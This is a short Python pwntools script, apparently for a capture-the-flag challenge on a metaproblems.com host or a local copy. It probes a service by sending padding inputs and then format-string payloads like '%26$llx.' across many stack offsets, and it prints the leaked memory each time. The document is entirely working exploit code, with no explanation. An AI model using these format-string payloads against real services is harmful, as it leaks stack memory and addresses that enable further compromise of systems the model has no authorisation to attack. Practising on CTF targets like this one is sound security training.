from pwn import *

if True:
    host = '127.0.0.1'
    port = 3005
    parm = 25
else:
    host = 'host1.metaproblems.com'
    port = 5470
    parm = 26

target = remote(host, port)
d = target.recvuntil(b'?\n')
for payload in [b'A', b'A'*8, b'A'*16, b'A'*24, b'A'*32 ]:
    target.send(payload)
    target.recvuntil(b'Your guessed wrong with ')
    target.recv(len(payload))
    d = target.recvall()
    d = d[ : -1]
    d += b'\x00' * (8 -len(d))
    print(payload, d)
    target.close()
    time.sleep(1)
    target = remote(host, port)
    d = target.recvuntil(b'?\n')
for n in [23, 24, 25, 26]:
    payload = f'%{n}$llx.'.encode('ascii')
    target.send(payload)
    target.recvuntil(b'Your guessed wrong with ')
    d = target.recvall()
    d = d[ : -1]
    d += b'\x00' * (8 -len(d))
    print(payload, d)
    target.close()
    time.sleep(1)
    target = remote(host, port)
    d = target.recvuntil(b'?\n')
for n in [24, 25, 26, 27]:
    payload = f'%{n}$llx.%{n+1}$llx.'.encode('ascii')
    target.send(payload)
    target.recvuntil(b'Your guessed wrong with ')
    d = target.recvall()
    d = d[ : -1]
    d += b'\x00' * (8 -len(d))
    print(payload, d)
    target.close()
    time.sleep(1)
    target = remote(host, port)
    d = target.recvuntil(b'?\n')
for n in [1, 4, 7, 10, 13, 16, 19, 27, 30, 33, 36, 39, 42]:
    payload = f'%26$llx.%{n}$llx.%{n+1}$llx.%{n+2}$llx.'.encode('ascii')
    target.send(payload)
    target.recvuntil(b'Your guessed wrong with ')
    d = target.recvall()
    d = d[ : -1]
    d += b'\x00' * (8 -len(d))
    print(payload, d)
    target.close()
    time.sleep(1)
    target = remote(host, port)
    d = target.recvuntil(b'?\n')
target.close()
